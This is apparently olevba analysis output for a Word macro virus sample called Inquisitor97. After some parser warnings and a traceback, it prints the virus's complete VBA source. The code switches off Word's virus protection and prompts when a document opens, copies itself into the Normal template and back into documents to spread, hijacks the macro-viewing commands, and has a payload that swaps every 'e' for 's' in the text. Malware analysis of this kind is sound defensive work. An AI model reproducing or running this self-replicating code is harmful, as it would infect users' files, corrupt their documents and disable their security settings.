olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inquisitor
Type: OLE
WARNING  invalid value for PROJECTLCIDINVOKE_Id expected 0014 got 0003
WARNING  invalid value for PROJECTLCIDINVOKE_Size expected 0004 got 0002
WARNING  invalid value for PROJECTLCIDINVOKE_LcidInvoke expected 0409 got 404E4
WARNING  invalid value for PROJECTCODEPAGE_Id expected 0003 got 0007
WARNING  invalid value for PROJECTCODEPAGE_Size expected 0002 got 72500000
WARNING  invalid value for PROJECTNAME_Id expected 0004 got 6365
ERROR    PROJECTNAME_SizeOfProjectName value not in range [1-128]: 1396
ERROR    Error in _extract_vba
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 3526, in extract_macros
    for stream_path, vba_filename, vba_code in \
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 2094, in _extract_vba
    project = VBA_Project(ole, vba_root, project_path, dir_path, relaxed)
  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 1752, in __init__
    projectdocstring_id = struct.unpack("<H", dir_stream.read(2))[0]
struct.error: unpack requires a buffer of 2 bytes
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Inquisitor - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Inquisitor - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1 
in file: Virus.MSWord.Inquisitor - OLE stream: 'Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
Call Inquisitor97
Call Payload(Int(Rnd(100)))
End Sub

Sub Inquisitor97()
On Error Resume Next
Set test = MacroContainer
If test = NormalTemplate Then Call n
If test = ActiveDocument Then Call a
End Sub

Sub n()
On Error Resume Next
Application.OrganizerDelete ActiveDocument.FullName, "Module1", wdOrganizerObjectProjectItems
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Module1", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub a()
On Error Resume Next
Application.OrganizerDelete NormalTemplate.FullName, "Module1", wdOrganizerObjectProjectItems
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Module1", wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Sub ToolsMacro()
MsgBox "You have been infected by Inquisitor97"
Payload (42)
End Sub
Sub ViewVBCode()
MsgBox "You have been infected by Inquisitor97"
Payload (42)
End Sub
Sub Payload(num As Single)
If num = 42 Then
    
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "e"
        .Replacement.Text = "s"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+

